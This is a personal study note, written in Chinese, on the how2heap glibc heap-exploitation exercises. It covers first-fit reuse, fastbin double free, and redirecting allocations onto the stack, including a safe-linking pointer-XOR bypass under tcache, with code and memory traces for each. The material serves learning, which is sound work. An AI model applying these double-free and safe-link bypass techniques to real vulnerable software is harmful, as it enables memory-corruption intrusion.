# Reference:
https://github.com/shellphish/how2heap/tree/master
https://www.giantbranch.cn/2017/09/29/how2heap%E5%AD%A6%E4%B9%A0/
# 1.0 first-fit
不是 攻击 只是一个structure 概念 
```
char* a = malloc(0x512);
char* b = malloc(0x256);
free(a) 
c = malloc(0x500);
```
只要 malloc c size < free a 的 size 
c 就会 占 a 的 allocation 
就是
```
0x5567377d6420 A
0x5567377d6630 B
free A -> [0x5567377d6420]
0x5567377d6420 c
-> []
```

# 2.0 fastbin_dup
double free 的感觉
```
int *a = calloc(1, 8);
int *b = calloc(1, 8);
int *c = calloc(1, 8);
free(a);
free(b);
free(a);
a = calloc(1, 8);
b = calloc(1, 8);
c = calloc(1, 8);
```
如果 malloc 了  A B C 
这时候 free A 后 就不能再 free A 了 会报错
因为 free list 最前面是 A
可是 如果我们 free B 后 还可以再 free A
malloc  E D F 
这个时候 E = A, D = B, F = A
```
1st malloc(8): 0x5565d7d0b420 A
2nd malloc(8): 0x5565d7d0b440 B
3rd malloc(8): 0x5565d7d0b460 C
free(a) -> [0x5565d7d0b420]
free(b) -> [0x5565d7d0b440,0x5565d7d0b420]
free(a) -> [0x5565d7d0b420,0x5565d7d0b440,0x5565d7d0b420]
1st malloc(8): 0x5565d7d0b420 E = A 
2nd malloc(8): 0x5565d7d0b440 D = B 
3rd malloc(8): 0x5565d7d0b420 F = A
-> []
```

# 3.0 fastbin_dup_into_stack 2.23 no tcache
如果要改 libc 版本
```shell
改 version
H2H_USE_SYSTEM_LIBC=N make v2.23

恢复
make clean base
```

这个结论是 可以用double free 改 return address 为 stack 上面的位置
```
int *a = malloc(1, 8);
int *b = malloc(1, 8);
int *c = malloc(1, 8);
free(a);
free(b);
free(a);
unsigned long long *d = malloc(8);
a = malloc(1, 8);
unsigned long long stack_var;
stack_var = 0x20;
*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
int *e = malloc(1, 8);
int *f = malloc(1, 8);
```
和 double free 概念一样
就是当 free list 还剩下 A 时候
其实我们已经 malloc 出一个 A
我们可以改这个malloc 出来的 A

怎样改？
xxx = 0x20 (一定要 是 0x20 这里是做 fake chunk
把可以控制的 A 改成 stack - 8 
下一次 malloc 的时候 A 就会出来
这个时候 free list 应该是 空的
可是再 malloc 一次  就会按 stack 的地址 + 0x10 出来 

结果
```
1st malloc(8): 0x559de864e010 A
2nd malloc(8): 0x559de864e030 B
3rd malloc(8): 0x559de864e050 C
free(a) -> [0x559de864e010]
free(b) -> [0x559de864e030,0x559de864e010]
free(a) -> [0x559de864e010,0x559de864e030,0x559de864e010]
1st malloc(8): 0x559de864e010 D = A 
2nd malloc(8): 0x559de864e030 E = B 
-> [0x559de864e010 A]
Now, we have access to 0x559de864e010 while it remains at the head of the free list
stack = 0x20 :  0x7ffd22f86028 STACK
*d =  0x7ffd22f86028 - 8 = 0x7ffd22f86020 <- 是value 不是address
3rd malloc(8): 0x559de864e010
-> []
4th malloc(8): 0x7ffd22f86030 <- 控制的地方是这里
```

# 4.0 fastbin_dup_into_stack 2.39 with tcache
with tache 就有一点不同
需要先填满 tache 
就是先 填满 7 次 然后再 free 完
```
void *ptrs[7];

	for (int i=0; i<7; i++) {
		ptrs[i] = malloc(8);
	}
	for (int i=0; i<7; i++) {
		free(ptrs[i]);
	}
```
bypass 的方法也是有一点 不同
可是原理是一样的 
现在 double free 完了 free list 还有 A 

要让 MALLOC 出来的 A = A address >> 12 ^ stack address
0x5583c772e380 >> 12 = 0x5583c772e
0x5583c772e ^  stack address (0x7ffc14f9db70) = 0x7ff94cc5ac5e

虽然 我最后 进 A 的 value是 0x7ff94cc5ac5e
可是 我 ret 出的 address 还是 0x7ffc14f9db70 + 0x10

去绕过 safe link detection
```
1st malloc(8): 0x5583c772e380 A
2nd malloc(8): 0x5583c772e3a0 B
3rd malloc(8): 0x5583c772e3c0 C
free(a) -> [0x5583c772e380]
free(b) -> [0x5583c772e3a0,0x5583c772e380]
free(a) -> [0x5583c772e380,0x5583c772e3a0,0x5583c772e380]
1st malloc(8): 0x5583c772e380 D = A 
2nd malloc(8): 0x5583c772e3a0 E = B 
-> [0x5583c772e380 A]
Now, we have access to 0x5583c772e380 while it remains at the head of the free list
stack = 0x20 :  0x7ffc14f9db70 STACK
*d =  0x5583c772e380 >> 12 ^ 0x7ffc14f9db70 = 0x7ff94cc5ac5e <- 是value 不是address
3rd malloc(8): 0x5583c772e380
-> []
4th malloc(8): 0x7ffc14f9db80 <- 控制的地方是这里
```


